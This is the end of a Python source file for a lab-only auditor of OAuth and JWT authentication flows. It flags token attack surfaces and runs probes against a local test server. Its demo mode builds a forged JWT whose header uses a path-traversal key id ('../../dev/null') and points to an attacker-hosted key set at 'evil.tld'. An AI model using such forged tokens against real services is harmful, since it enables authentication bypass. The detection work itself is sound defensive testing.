    L.append("\n---\n*Fin du rapport d'acceptance. Prochain palier : L* actif (AALpy) en v2 (à confirmer).*\n")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(L))


# ===========================================================================
# demo mode (v0 compatibility) — synthetic traces, JWT audits
# ===========================================================================

def b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def audit_jwt(token: str, expected_alg: str | None = None) -> dict[str, Any]:
    report: dict[str, Any] = {"verdict_flags": []}
    try:
        h_b64, p_b64, *_ = token.split(".")
        header = json.loads(b64url_decode(h_b64))
        payload = json.loads(b64url_decode(p_b64))
    except Exception as exc:
        return {"verdict_flags": ["MALFORMED"], "error": str(exc)}
    alg = header.get("alg")
    report["header"], report["claims"] = header, payload
    if alg in (None, "none"):
        report["verdict_flags"].append("ALG_NONE_ACCEPTABLE_SURFACE")
    if expected_alg and alg != expected_alg and str(alg).startswith("HS"):
        report["verdict_flags"].append(f"ALG_CONFUSION_SURFACE({expected_alg}->{alg})")
    kid = header.get("kid")
    if isinstance(kid, str) and ("../" in kid or kid.startswith(("/", "%"))):
        report["verdict_flags"].append("KID_INJECTION_SURFACE")
    for k in ("jku", "x5u"):
        if k in header:
            report["verdict_flags"].append(f"{k.upper()}_REMOTE_KEY_SURFACE")
    if "jwk" in header:
        report["verdict_flags"].append("JWK_EMBEDDED_KEY_SURFACE")
    report["binding"] = {"subject": payload.get("sub"),
                         "audience": payload.get("aud"),
                         "issuer": payload.get("iss")}
    return report


def demo_mode() -> int:
    tok_evil = ".".join([
        base64.urlsafe_b64encode(json.dumps(
            {"alg": "HS256", "kid": "../../dev/null",
             "jku": "https://evil.tld/jwks.json"}).encode()).decode().rstrip("="),
        base64.urlsafe_b64encode(json.dumps(
            {"sub": "attacker", "aud": ["api.internal"],
             "iss": "https://attacker.tld"}).encode()).decode().rstrip("="),
        "DEMO_NOT_A_REAL_SIGNATURE"])
    print(json.dumps({"demo_jwt_audit": audit_jwt(tok_evil, expected_alg="RS256"),
                      "note": "v0 demo preserved — use --live for the lab"},
                     indent=2))
    return 0


# ===========================================================================
# main
# ===========================================================================

def live_mode(target: str, report_path: str | None, json_path: str | None) -> int:
    u = urllib.parse.urlparse(target)
    driver = LabDriver(u.hostname or "127.0.0.1", u.port or 80)
    if not driver.health():
        print("[!] target /health failed — is the lab running? "
              "python research/lab_oauth/lab_server.py", file=sys.stderr)
        return 2
    print(f"[+] lab alive on {target}", file=sys.stderr)

    runner = LiveRunner(driver, target_info={
        "url": target, "flow": "oauth2_code", "mode": "lab_acceptance"})
    results = [
        runner.probe_d1(),
        runner.probe_d2(),
        runner.probe_d3(),
        runner.probe_d4(),
        runner.probe_d5(),
        runner.probe_d6(),
        runner.probe_race(),
    ]

    # monitors over the LIVE traces (independent second pass — corroboration;
    # scoped per flaw to avoid noisy duplicates of the direct probes)
    machine = PrefixTreeMachine()
    machine.learn(runner.traces)
    ns, nr = NoSkipMonitor({}, {"state_verify"}, machine=machine), NoReplayMonitor()
    mx = MixupMonitor(trusted_issuers={ISSUERS["A"]},
                      expected_rs_issuers={"/api/user": {ISSUERS["A"]}})
    bm = BindingMonitor()
    d2_trace = next((t for t in runner.traces if t.trace_id == "d2-state-unbound"),
                    None)
    for f in (ns.run(d2_trace) if d2_trace else []):
        runner.vb.add("no_skip", {**f, "flaw": "D2(monitor-pass)",
                                  "reproduced": True})
    d1_trace = next((t for t in runner.traces if t.trace_id == "d1-pkce-binding"),
                    None)
    for t in runner.traces:
        for f in nr.run(t):
            runner.vb.add("no_replay", {**f, "flaw": "D3(monitor-pass)",
                                        "reproduced": True})
        for f in mx.run(t):
            runner.vb.add("issuer_confinement", {**f, "flaw": "D6(monitor-pass)",
                                                 "reproduced": True})
        if d1_trace and t is d1_trace:
            for f in bm.run_pkce(t):
                runner.vb.add("binding_preservation",
                              {**f, "flaw": "D1(monitor-pass)", "reproduced": True})

    race = next((r["finding"]["evidence"]["race"] for r in results
                 if r["flaw"] == "D3-race" and r["finding"]), {})
    entropy = [r["finding"]["evidence"].get("entropy_report")
               for r in results if r["flaw"] == "D5" and r.get("finding")]
    machine_sum = machine.summary()
    runner.vb.finalize()   # dedup flags avant l'écriture du contrat
    verdict_json = runner.vb.to_json(machine_sum, [e for e in entropy if e],
                                     race)

    if json_path:
        with open(json_path, "w", encoding="utf-8") as fh:
            fh.write(verdict_json)
        print(f"[+] verdict JSON: {json_path}", file=sys.stderr)
    if report_path:
        write_report(report_path, target, results, machine_sum, race, verdict_json)
        print(f"[+] acceptance report: {report_path}", file=sys.stderr)

    v = json.loads(verdict_json)
    print(json.dumps({"exploitable": v["exploitable"], "summary": v["summary"],
                      "flaws": {r["flaw"]: ("CAUGHT" if r["caught"] else "MISSED")
                                for r in results}}, indent=2))
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(prog=ENGINE,
                                 description="auth flow state-machine auditor (v1, lab use only)")
    ap.add_argument("--live", action="store_true", help="run against a live lab target")
    ap.add_argument("--target", default="http://127.0.0.1:9443")
    ap.add_argument("--report", help="write markdown acceptance report")
    ap.add_argument("--json", dest="json_out", help="write verdict() JSON")
    ap.add_argument("--demo", action="store_true", help="v0 synthetic demo")
    args = ap.parse_args()

    if args.demo or not args.live:
        return demo_mode()
    return live_mode(args.target, args.report, args.json_out)


if __name__ == "__main__":
    raise SystemExit(main())
